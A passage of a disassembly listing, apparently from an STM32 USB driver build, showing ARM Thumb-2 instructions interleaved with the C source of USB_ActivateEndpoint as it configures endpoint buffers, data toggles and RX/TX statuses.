 80060ea:	62fb      	str	r3, [r7, #44]	; 0x2c
 80060ec:	683b      	ldr	r3, [r7, #0]
 80060ee:	88db      	ldrh	r3, [r3, #6]
 80060f0:	085b      	lsrs	r3, r3, #1
 80060f2:	b29b      	uxth	r3, r3
 80060f4:	005b      	lsls	r3, r3, #1
 80060f6:	b29a      	uxth	r2, r3
 80060f8:	6afb      	ldr	r3, [r7, #44]	; 0x2c
 80060fa:	801a      	strh	r2, [r3, #0]

      /* Set the endpoint Receive buffer counter */
      PCD_SET_EP_RX_CNT(USBx, ep->num, ep->maxpacket);
 80060fc:	687b      	ldr	r3, [r7, #4]
 80060fe:	62bb      	str	r3, [r7, #40]	; 0x28
 8006100:	687b      	ldr	r3, [r7, #4]
 8006102:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8006106:	b29b      	uxth	r3, r3
 8006108:	461a      	mov	r2, r3
 800610a:	6abb      	ldr	r3, [r7, #40]	; 0x28
 800610c:	4413      	add	r3, r2
 800610e:	62bb      	str	r3, [r7, #40]	; 0x28
 8006110:	683b      	ldr	r3, [r7, #0]
 8006112:	781b      	ldrb	r3, [r3, #0]
 8006114:	00da      	lsls	r2, r3, #3
 8006116:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8006118:	4413      	add	r3, r2
 800611a:	f203 4306 	addw	r3, r3, #1030	; 0x406
 800611e:	627b      	str	r3, [r7, #36]	; 0x24
 8006120:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006122:	881b      	ldrh	r3, [r3, #0]
 8006124:	b29b      	uxth	r3, r3
 8006126:	f3c3 0309 	ubfx	r3, r3, #0, #10
 800612a:	b29a      	uxth	r2, r3
 800612c:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 800612e:	801a      	strh	r2, [r3, #0]
 8006130:	683b      	ldr	r3, [r7, #0]
 8006132:	691b      	ldr	r3, [r3, #16]
 8006134:	2b3e      	cmp	r3, #62	; 0x3e
 8006136:	d91d      	bls.n	8006174 <USB_ActivateEndpoint+0x2b0>
 8006138:	683b      	ldr	r3, [r7, #0]
 800613a:	691b      	ldr	r3, [r3, #16]
 800613c:	095b      	lsrs	r3, r3, #5
 800613e:	66bb      	str	r3, [r7, #104]	; 0x68
 8006140:	683b      	ldr	r3, [r7, #0]
 8006142:	691b      	ldr	r3, [r3, #16]
 8006144:	f003 031f 	and.w	r3, r3, #31
 8006148:	2b00      	cmp	r3, #0
 800614a:	d102      	bne.n	8006152 <USB_ActivateEndpoint+0x28e>
 800614c:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 800614e:	3b01      	subs	r3, #1
 8006150:	66bb      	str	r3, [r7, #104]	; 0x68
 8006152:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006154:	881b      	ldrh	r3, [r3, #0]
 8006156:	b29a      	uxth	r2, r3
 8006158:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 800615a:	b29b      	uxth	r3, r3
 800615c:	029b      	lsls	r3, r3, #10
 800615e:	b29b      	uxth	r3, r3
 8006160:	4313      	orrs	r3, r2
 8006162:	b29b      	uxth	r3, r3
 8006164:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8006168:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 800616c:	b29a      	uxth	r2, r3
 800616e:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006170:	801a      	strh	r2, [r3, #0]
 8006172:	e026      	b.n	80061c2 <USB_ActivateEndpoint+0x2fe>
 8006174:	683b      	ldr	r3, [r7, #0]
 8006176:	691b      	ldr	r3, [r3, #16]
 8006178:	2b00      	cmp	r3, #0
 800617a:	d10a      	bne.n	8006192 <USB_ActivateEndpoint+0x2ce>
 800617c:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 800617e:	881b      	ldrh	r3, [r3, #0]
 8006180:	b29b      	uxth	r3, r3
 8006182:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8006186:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 800618a:	b29a      	uxth	r2, r3
 800618c:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 800618e:	801a      	strh	r2, [r3, #0]
 8006190:	e017      	b.n	80061c2 <USB_ActivateEndpoint+0x2fe>
 8006192:	683b      	ldr	r3, [r7, #0]
 8006194:	691b      	ldr	r3, [r3, #16]
 8006196:	085b      	lsrs	r3, r3, #1
 8006198:	66bb      	str	r3, [r7, #104]	; 0x68
 800619a:	683b      	ldr	r3, [r7, #0]
 800619c:	691b      	ldr	r3, [r3, #16]
 800619e:	f003 0301 	and.w	r3, r3, #1
 80061a2:	2b00      	cmp	r3, #0
 80061a4:	d002      	beq.n	80061ac <USB_ActivateEndpoint+0x2e8>
 80061a6:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 80061a8:	3301      	adds	r3, #1
 80061aa:	66bb      	str	r3, [r7, #104]	; 0x68
 80061ac:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 80061ae:	881b      	ldrh	r3, [r3, #0]
 80061b0:	b29a      	uxth	r2, r3
 80061b2:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 80061b4:	b29b      	uxth	r3, r3
 80061b6:	029b      	lsls	r3, r3, #10
 80061b8:	b29b      	uxth	r3, r3
 80061ba:	4313      	orrs	r3, r2
 80061bc:	b29a      	uxth	r2, r3
 80061be:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 80061c0:	801a      	strh	r2, [r3, #0]
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
 80061c2:	687a      	ldr	r2, [r7, #4]
 80061c4:	683b      	ldr	r3, [r7, #0]
 80061c6:	781b      	ldrb	r3, [r3, #0]
 80061c8:	009b      	lsls	r3, r3, #2
 80061ca:	4413      	add	r3, r2
 80061cc:	881b      	ldrh	r3, [r3, #0]
 80061ce:	847b      	strh	r3, [r7, #34]	; 0x22
 80061d0:	8c7b      	ldrh	r3, [r7, #34]	; 0x22
 80061d2:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 80061d6:	2b00      	cmp	r3, #0
 80061d8:	d01b      	beq.n	8006212 <USB_ActivateEndpoint+0x34e>
 80061da:	687a      	ldr	r2, [r7, #4]
 80061dc:	683b      	ldr	r3, [r7, #0]
 80061de:	781b      	ldrb	r3, [r3, #0]
 80061e0:	009b      	lsls	r3, r3, #2
 80061e2:	4413      	add	r3, r2
 80061e4:	881b      	ldrh	r3, [r3, #0]
 80061e6:	b29b      	uxth	r3, r3
 80061e8:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80061ec:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80061f0:	843b      	strh	r3, [r7, #32]
 80061f2:	687a      	ldr	r2, [r7, #4]
 80061f4:	683b      	ldr	r3, [r7, #0]
 80061f6:	781b      	ldrb	r3, [r3, #0]
 80061f8:	009b      	lsls	r3, r3, #2
 80061fa:	441a      	add	r2, r3
 80061fc:	8c3b      	ldrh	r3, [r7, #32]
 80061fe:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006202:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006206:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 800620a:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800620e:	b29b      	uxth	r3, r3
 8006210:	8013      	strh	r3, [r2, #0]

      if (ep->num == 0U)
 8006212:	683b      	ldr	r3, [r7, #0]
 8006214:	781b      	ldrb	r3, [r3, #0]
 8006216:	2b00      	cmp	r3, #0
 8006218:	d124      	bne.n	8006264 <USB_ActivateEndpoint+0x3a0>
      {
        /* Configure VALID status for EP0 */
        PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_VALID);
 800621a:	687a      	ldr	r2, [r7, #4]
 800621c:	683b      	ldr	r3, [r7, #0]
 800621e:	781b      	ldrb	r3, [r3, #0]
 8006220:	009b      	lsls	r3, r3, #2
 8006222:	4413      	add	r3, r2
 8006224:	881b      	ldrh	r3, [r3, #0]
 8006226:	b29b      	uxth	r3, r3
 8006228:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 800622c:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006230:	83bb      	strh	r3, [r7, #28]
 8006232:	8bbb      	ldrh	r3, [r7, #28]
 8006234:	f483 5380 	eor.w	r3, r3, #4096	; 0x1000
 8006238:	83bb      	strh	r3, [r7, #28]
 800623a:	8bbb      	ldrh	r3, [r7, #28]
 800623c:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 8006240:	83bb      	strh	r3, [r7, #28]
 8006242:	687a      	ldr	r2, [r7, #4]
 8006244:	683b      	ldr	r3, [r7, #0]
 8006246:	781b      	ldrb	r3, [r3, #0]
 8006248:	009b      	lsls	r3, r3, #2
 800624a:	441a      	add	r2, r3
 800624c:	8bbb      	ldrh	r3, [r7, #28]
 800624e:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006252:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006256:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800625a:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800625e:	b29b      	uxth	r3, r3
 8006260:	8013      	strh	r3, [r2, #0]
 8006262:	e1ea      	b.n	800663a <USB_ActivateEndpoint+0x776>
      }
      else
      {
        /* Configure NAK status for OUT Endpoint */
        PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_NAK);
 8006264:	687a      	ldr	r2, [r7, #4]
 8006266:	683b      	ldr	r3, [r7, #0]
 8006268:	781b      	ldrb	r3, [r3, #0]
 800626a:	009b      	lsls	r3, r3, #2
 800626c:	4413      	add	r3, r2
 800626e:	881b      	ldrh	r3, [r3, #0]
 8006270:	b29b      	uxth	r3, r3
 8006272:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 8006276:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800627a:	83fb      	strh	r3, [r7, #30]
 800627c:	8bfb      	ldrh	r3, [r7, #30]
 800627e:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 8006282:	83fb      	strh	r3, [r7, #30]
 8006284:	687a      	ldr	r2, [r7, #4]
 8006286:	683b      	ldr	r3, [r7, #0]
 8006288:	781b      	ldrb	r3, [r3, #0]
 800628a:	009b      	lsls	r3, r3, #2
 800628c:	441a      	add	r2, r3
 800628e:	8bfb      	ldrh	r3, [r7, #30]
 8006290:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006294:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006298:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800629c:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80062a0:	b29b      	uxth	r3, r3
 80062a2:	8013      	strh	r3, [r2, #0]
 80062a4:	e1c9      	b.n	800663a <USB_ActivateEndpoint+0x776>
  }
#if (USE_USB_DOUBLE_BUFFER == 1U)
  /* Double Buffer */
  else
  {
    if (ep->type == EP_TYPE_BULK)
 80062a6:	683b      	ldr	r3, [r7, #0]
 80062a8:	78db      	ldrb	r3, [r3, #3]
 80062aa:	2b02      	cmp	r3, #2
 80062ac:	d11e      	bne.n	80062ec <USB_ActivateEndpoint+0x428>
    {
      /* Set bulk endpoint as double buffered */
      PCD_SET_BULK_EP_DBUF(USBx, ep->num);
 80062ae:	687a      	ldr	r2, [r7, #4]
 80062b0:	683b      	ldr	r3, [r7, #0]
 80062b2:	781b      	ldrb	r3, [r3, #0]
 80062b4:	009b      	lsls	r3, r3, #2
 80062b6:	4413      	add	r3, r2
 80062b8:	881b      	ldrh	r3, [r3, #0]
 80062ba:	b29b      	uxth	r3, r3
 80062bc:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80062c0:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80062c4:	f8a7 3062 	strh.w	r3, [r7, #98]	; 0x62
 80062c8:	687a      	ldr	r2, [r7, #4]
 80062ca:	683b      	ldr	r3, [r7, #0]
 80062cc:	781b      	ldrb	r3, [r3, #0]
 80062ce:	009b      	lsls	r3, r3, #2
 80062d0:	441a      	add	r2, r3
 80062d2:	f8b7 3062 	ldrh.w	r3, [r7, #98]	; 0x62
 80062d6:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80062da:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80062de:	f443 4301 	orr.w	r3, r3, #33024	; 0x8100
 80062e2:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80062e6:	b29b      	uxth	r3, r3
 80062e8:	8013      	strh	r3, [r2, #0]
 80062ea:	e01d      	b.n	8006328 <USB_ActivateEndpoint+0x464>
    }
    else
    {
      /* Set the ISOC endpoint in double buffer mode */
      PCD_CLEAR_EP_KIND(USBx, ep->num);
 80062ec:	687a      	ldr	r2, [r7, #4]
 80062ee:	683b      	ldr	r3, [r7, #0]
 80062f0:	781b      	ldrb	r3, [r3, #0]
 80062f2:	009b      	lsls	r3, r3, #2
 80062f4:	4413      	add	r3, r2
 80062f6:	881b      	ldrh	r3, [r3, #0]
 80062f8:	b29b      	uxth	r3, r3
 80062fa:	f423 43e2 	bic.w	r3, r3, #28928	; 0x7100
 80062fe:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006302:	f8a7 3064 	strh.w	r3, [r7, #100]	; 0x64
 8006306:	687a      	ldr	r2, [r7, #4]
 8006308:	683b      	ldr	r3, [r7, #0]
 800630a:	781b      	ldrb	r3, [r3, #0]
 800630c:	009b      	lsls	r3, r3, #2
 800630e:	441a      	add	r2, r3
 8006310:	f8b7 3064 	ldrh.w	r3, [r7, #100]	; 0x64
 8006314:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006318:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800631c:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006320:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006324:	b29b      	uxth	r3, r3
 8006326:	8013      	strh	r3, [r2, #0]
    }

    /* Set buffer address for double buffered mode */
    PCD_SET_EP_DBUF_ADDR(USBx, ep->num, ep->pmaaddr0, ep->pmaaddr1);
 8006328:	687b      	ldr	r3, [r7, #4]
 800632a:	65fb      	str	r3, [r7, #92]	; 0x5c
 800632c:	687b      	ldr	r3, [r7, #4]
 800632e:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8006332:	b29b      	uxth	r3, r3
 8006334:	461a      	mov	r2, r3
 8006336:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 8006338:	4413      	add	r3, r2
 800633a:	65fb      	str	r3, [r7, #92]	; 0x5c
 800633c:	683b      	ldr	r3, [r7, #0]
 800633e:	781b      	ldrb	r3, [r3, #0]
 8006340:	00da      	lsls	r2, r3, #3
 8006342:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 8006344:	4413      	add	r3, r2
 8006346:	f503 6380 	add.w	r3, r3, #1024	; 0x400
 800634a:	65bb      	str	r3, [r7, #88]	; 0x58
 800634c:	683b      	ldr	r3, [r7, #0]
 800634e:	891b      	ldrh	r3, [r3, #8]
 8006350:	085b      	lsrs	r3, r3, #1
 8006352:	b29b      	uxth	r3, r3
 8006354:	005b      	lsls	r3, r3, #1
 8006356:	b29a      	uxth	r2, r3
 8006358:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 800635a:	801a      	strh	r2, [r3, #0]
 800635c:	687b      	ldr	r3, [r7, #4]
 800635e:	657b      	str	r3, [r7, #84]	; 0x54
 8006360:	687b      	ldr	r3, [r7, #4]
 8006362:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8006366:	b29b      	uxth	r3, r3
 8006368:	461a      	mov	r2, r3
 800636a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800636c:	4413      	add	r3, r2
 800636e:	657b      	str	r3, [r7, #84]	; 0x54
 8006370:	683b      	ldr	r3, [r7, #0]
 8006372:	781b      	ldrb	r3, [r3, #0]
 8006374:	00da      	lsls	r2, r3, #3
 8006376:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8006378:	4413      	add	r3, r2
 800637a:	f203 4304 	addw	r3, r3, #1028	; 0x404
 800637e:	653b      	str	r3, [r7, #80]	; 0x50
 8006380:	683b      	ldr	r3, [r7, #0]
 8006382:	895b      	ldrh	r3, [r3, #10]
 8006384:	085b      	lsrs	r3, r3, #1
 8006386:	b29b      	uxth	r3, r3
 8006388:	005b      	lsls	r3, r3, #1
 800638a:	b29a      	uxth	r2, r3
 800638c:	6d3b      	ldr	r3, [r7, #80]	; 0x50
 800638e:	801a      	strh	r2, [r3, #0]

    if (ep->is_in == 0U)
 8006390:	683b      	ldr	r3, [r7, #0]
 8006392:	785b      	ldrb	r3, [r3, #1]
 8006394:	2b00      	cmp	r3, #0
 8006396:	f040 8093 	bne.w	80064c0 <USB_ActivateEndpoint+0x5fc>
    {
      /* Clear the data toggle bits for the endpoint IN/OUT */
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
 800639a:	687a      	ldr	r2, [r7, #4]
 800639c:	683b      	ldr	r3, [r7, #0]
 800639e:	781b      	ldrb	r3, [r3, #0]
 80063a0:	009b      	lsls	r3, r3, #2
 80063a2:	4413      	add	r3, r2
 80063a4:	881b      	ldrh	r3, [r3, #0]
 80063a6:	f8a7 3040 	strh.w	r3, [r7, #64]	; 0x40
 80063aa:	f8b7 3040 	ldrh.w	r3, [r7, #64]	; 0x40
 80063ae:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 80063b2:	2b00      	cmp	r3, #0
 80063b4:	d01b      	beq.n	80063ee <USB_ActivateEndpoint+0x52a>
 80063b6:	687a      	ldr	r2, [r7, #4]
 80063b8:	683b      	ldr	r3, [r7, #0]
 80063ba:	781b      	ldrb	r3, [r3, #0]
 80063bc:	009b      	lsls	r3, r3, #2
 80063be:	4413      	add	r3, r2
 80063c0:	881b      	ldrh	r3, [r3, #0]
 80063c2:	b29b      	uxth	r3, r3
 80063c4:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80063c8:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80063cc:	87fb      	strh	r3, [r7, #62]	; 0x3e
 80063ce:	687a      	ldr	r2, [r7, #4]
 80063d0:	683b      	ldr	r3, [r7, #0]
 80063d2:	781b      	ldrb	r3, [r3, #0]
 80063d4:	009b      	lsls	r3, r3, #2
 80063d6:	441a      	add	r2, r3
 80063d8:	8ffb      	ldrh	r3, [r7, #62]	; 0x3e
 80063da:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80063de:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80063e2:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 80063e6:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80063ea:	b29b      	uxth	r3, r3
 80063ec:	8013      	strh	r3, [r2, #0]
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 80063ee:	687a      	ldr	r2, [r7, #4]
 80063f0:	683b      	ldr	r3, [r7, #0]
 80063f2:	781b      	ldrb	r3, [r3, #0]
 80063f4:	009b      	lsls	r3, r3, #2
 80063f6:	4413      	add	r3, r2
 80063f8:	881b      	ldrh	r3, [r3, #0]
 80063fa:	87bb      	strh	r3, [r7, #60]	; 0x3c
 80063fc:	8fbb      	ldrh	r3, [r7, #60]	; 0x3c
 80063fe:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8006402:	2b00      	cmp	r3, #0
 8006404:	d01b      	beq.n	800643e <USB_ActivateEndpoint+0x57a>
 8006406:	687a      	ldr	r2, [r7, #4]
 8006408:	683b      	ldr	r3, [r7, #0]
 800640a:	781b      	ldrb	r3, [r3, #0]
 800640c:	009b      	lsls	r3, r3, #2
 800640e:	4413      	add	r3, r2
 8006410:	881b      	ldrh	r3, [r3, #0]
 8006412:	b29b      	uxth	r3, r3
 8006414:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006418:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800641c:	877b      	strh	r3, [r7, #58]	; 0x3a
 800641e:	687a      	ldr	r2, [r7, #4]
 8006420:	683b      	ldr	r3, [r7, #0]
 8006422:	781b      	ldrb	r3, [r3, #0]
 8006424:	009b      	lsls	r3, r3, #2
 8006426:	441a      	add	r2, r3
 8006428:	8f7b      	ldrh	r3, [r7, #58]	; 0x3a
 800642a:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800642e:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006432:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006436:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 800643a:	b29b      	uxth	r3, r3
 800643c:	8013      	strh	r3, [r2, #0]

      PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_VALID);
 800643e:	687a      	ldr	r2, [r7, #4]
 8006440:	683b      	ldr	r3, [r7, #0]
 8006442:	781b      	ldrb	r3, [r3, #0]
 8006444:	009b      	lsls	r3, r3, #2
 8006446:	4413      	add	r3, r2
 8006448:	881b      	ldrh	r3, [r3, #0]
 800644a:	b29b      	uxth	r3, r3
 800644c:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 8006450:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006454:	873b      	strh	r3, [r7, #56]	; 0x38
 8006456:	8f3b      	ldrh	r3, [r7, #56]	; 0x38
 8006458:	f483 5380 	eor.w	r3, r3, #4096	; 0x1000
 800645c:	873b      	strh	r3, [r7, #56]	; 0x38
 800645e:	8f3b      	ldrh	r3, [r7, #56]	; 0x38
 8006460:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 8006464:	873b      	strh	r3, [r7, #56]	; 0x38
 8006466:	687a      	ldr	r2, [r7, #4]
 8006468:	683b      	ldr	r3, [r7, #0]
 800646a:	781b      	ldrb	r3, [r3, #0]
 800646c:	009b      	lsls	r3, r3, #2
 800646e:	441a      	add	r2, r3
 8006470:	8f3b      	ldrh	r3, [r7, #56]	; 0x38
 8006472:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006476:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800647a:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800647e:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006482:	b29b      	uxth	r3, r3
 8006484:	8013      	strh	r3, [r2, #0]
      PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_DIS);
 8006486:	687a      	ldr	r2, [r7, #4]
 8006488:	683b      	ldr	r3, [r7, #0]
 800648a:	781b      	ldrb	r3, [r3, #0]
 800648c:	009b      	lsls	r3, r3, #2
 800648e:	4413      	add	r3, r2
 8006490:	881b      	ldrh	r3, [r3, #0]
 8006492:	b29b      	uxth	r3, r3
 8006494:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006498:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 800649c:	86fb      	strh	r3, [r7, #54]	; 0x36
 800649e:	687a      	ldr	r2, [r7, #4]
 80064a0:	683b      	ldr	r3, [r7, #0]
 80064a2:	781b      	ldrb	r3, [r3, #0]
 80064a4:	009b      	lsls	r3, r3, #2
 80064a6:	441a      	add	r2, r3
 80064a8:	8efb      	ldrh	r3, [r7, #54]	; 0x36
 80064aa:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80064ae:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80064b2:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80064b6:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80064ba:	b29b      	uxth	r3, r3
 80064bc:	8013      	strh	r3, [r2, #0]
 80064be:	e0bc      	b.n	800663a <USB_ActivateEndpoint+0x776>
    }
    else
    {
      /* Clear the data toggle bits for the endpoint IN/OUT */
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
 80064c0:	687a      	ldr	r2, [r7, #4]
 80064c2:	683b      	ldr	r3, [r7, #0]
 80064c4:	781b      	ldrb	r3, [r3, #0]
 80064c6:	009b      	lsls	r3, r3, #2
 80064c8:	4413      	add	r3, r2
 80064ca:	881b      	ldrh	r3, [r3, #0]
 80064cc:	f8a7 304e 	strh.w	r3, [r7, #78]	; 0x4e
 80064d0:	f8b7 304e 	ldrh.w	r3, [r7, #78]	; 0x4e
 80064d4:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 80064d8:	2b00      	cmp	r3, #0
 80064da:	d01d      	beq.n	8006518 <USB_ActivateEndpoint+0x654>
 80064dc:	687a      	ldr	r2, [r7, #4]
 80064de:	683b      	ldr	r3, [r7, #0]
 80064e0:	781b      	ldrb	r3, [r3, #0]
 80064e2:	009b      	lsls	r3, r3, #2
 80064e4:	4413      	add	r3, r2
 80064e6:	881b      	ldrh	r3, [r3, #0]
 80064e8:	b29b      	uxth	r3, r3
 80064ea:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80064ee:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80064f2:	f8a7 304c 	strh.w	r3, [r7, #76]	; 0x4c
 80064f6:	687a      	ldr	r2, [r7, #4]
 80064f8:	683b      	ldr	r3, [r7, #0]
 80064fa:	781b      	ldrb	r3, [r3, #0]
 80064fc:	009b      	lsls	r3, r3, #2
 80064fe:	441a      	add	r2, r3
 8006500:	f8b7 304c 	ldrh.w	r3, [r7, #76]	; 0x4c
 8006504:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006508:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800650c:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 8006510:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006514:	b29b      	uxth	r3, r3
 8006516:	8013      	strh	r3, [r2, #0]
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 8006518:	687a      	ldr	r2, [r7, #4]
 800651a:	683b      	ldr	r3, [r7, #0]
 800651c:	781b      	ldrb	r3, [r3, #0]
 800651e:	009b      	lsls	r3, r3, #2
 8006520:	4413      	add	r3, r2
 8006522:	881b      	ldrh	r3, [r3, #0]
 8006524:	f8a7 304a 	strh.w	r3, [r7, #74]	; 0x4a
 8006528:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 800652c:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8006530:	2b00      	cmp	r3, #0
 8006532:	d01d      	beq.n	8006570 <USB_ActivateEndpoint+0x6ac>
 8006534:	687a      	ldr	r2, [r7, #4]
 8006536:	683b      	ldr	r3, [r7, #0]
 8006538:	781b      	ldrb	r3, [r3, #0]
 800653a:	009b      	lsls	r3, r3, #2
 800653c:	4413      	add	r3, r2
 800653e:	881b      	ldrh	r3, [r3, #0]
 8006540:	b29b      	uxth	r3, r3
 8006542:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006546:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800654a:	f8a7 3048 	strh.w	r3, [r7, #72]	; 0x48
 800654e:	687a      	ldr	r2, [r7, #4]
 8006550:	683b      	ldr	r3, [r7, #0]
 8006552:	781b      	ldrb	r3, [r3, #0]
 8006554:	009b      	lsls	r3, r3, #2
 8006556:	441a      	add	r2, r3
 8006558:	f8b7 3048 	ldrh.w	r3, [r7, #72]	; 0x48
 800655c:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006560:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006564:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006568:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 800656c:	b29b      	uxth	r3, r3
 800656e:	8013      	strh	r3, [r2, #0]

      if (ep->type != EP_TYPE_ISOC)
 8006570:	683b      	ldr	r3, [r7, #0]
 8006572:	78db      	ldrb	r3, [r3, #3]
 8006574:	2b01      	cmp	r3, #1
 8006576:	d024      	beq.n	80065c2 <USB_ActivateEndpoint+0x6fe>
      {
        /* Configure NAK status for the Endpoint */
        PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_NAK);
 8006578:	687a      	ldr	r2, [r7, #4]
 800657a:	683b      	ldr	r3, [r7, #0]
 800657c:	781b      	ldrb	r3, [r3, #0]
 800657e:	009b      	lsls	r3, r3, #2
 8006580:	4413      	add	r3, r2
 8006582:	881b      	ldrh	r3, [r3, #0]
 8006584:	b29b      	uxth	r3, r3
 8006586:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800658a:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 800658e:	f8a7 3044 	strh.w	r3, [r7, #68]	; 0x44
 8006592:	f8b7 3044 	ldrh.w	r3, [r7, #68]	; 0x44
 8006596:	f083 0320 	eor.w	r3, r3, #32
 800659a:	f8a7 3044 	strh.w	r3, [r7, #68]	; 0x44
 800659e:	687a      	ldr	r2, [r7, #4]
 80065a0:	683b      	ldr	r3, [r7, #0]
 80065a2:	781b      	ldrb	r3, [r3, #0]
 80065a4:	009b      	lsls	r3, r3, #2
 80065a6:	441a      	add	r2, r3
 80065a8:	f8b7 3044 	ldrh.w	r3, [r7, #68]	; 0x44
 80065ac:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80065b0:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80065b4:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80065b8:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80065bc:	b29b      	uxth	r3, r3
 80065be:	8013      	strh	r3, [r2, #0]
 80065c0:	e01d      	b.n	80065fe <USB_ActivateEndpoint+0x73a>
      }
      else
      {
        /* Configure TX Endpoint to disabled state */
